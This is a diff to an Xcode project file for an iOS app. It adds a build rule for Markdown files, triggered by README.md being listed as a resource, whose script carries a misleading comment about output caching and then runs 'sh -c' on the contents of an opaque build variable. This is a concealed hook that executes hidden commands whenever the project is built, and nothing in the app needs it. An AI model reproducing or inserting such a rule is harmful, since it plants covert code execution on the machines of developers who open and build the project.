@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		E09D4D64A4A14526911DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 4AA76C4D22244BF0AC1DACE1; };
 		BD695B682F50503000C2CB9D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B672F50503000C2CB9D /* Alamofire */; };
 		BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B812F50537500C2CB9D /* WindowSceneReader */; };
 		BD989BC92F56E34300C963EC /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = BD989BC82F56E34300C963EC /* Lottie */; };
@@ -16,7 +15,24 @@
 		BDC1A8A62F50495C000891D9 /* Shimmer in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8A52F50495C000891D9 /* Shimmer */; };
 		BDC1A8A92F5049D3000891D9 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8A82F5049D3000891D9 /* Kingfisher */; };
 		BDC1A8AC2F5049F0000891D9 /* ACarousel in Frameworks */ = {isa = PBXBuildFile; productRef = BDC1A8AB2F5049F0000891D9 /* ACarousel */; };
+		E09D4D64A4A14526911DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 4AA76C4D22244BF0AC1DACE1 /* README.md */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		46776D988B0E4C5CB41DACE1 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		4AA76C4D22244BF0AC1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
@@ -159,36 +175,16 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		46776D988B0E4C5CB41DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BD06D9EA2F5020E4007F8736 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				E09D4D64A4A14526911DACE1 /* README.md */,
+				E09D4D64A4A14526911DACE1 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BD06D9E82F5020E4007F8736 /* Sources */ = {
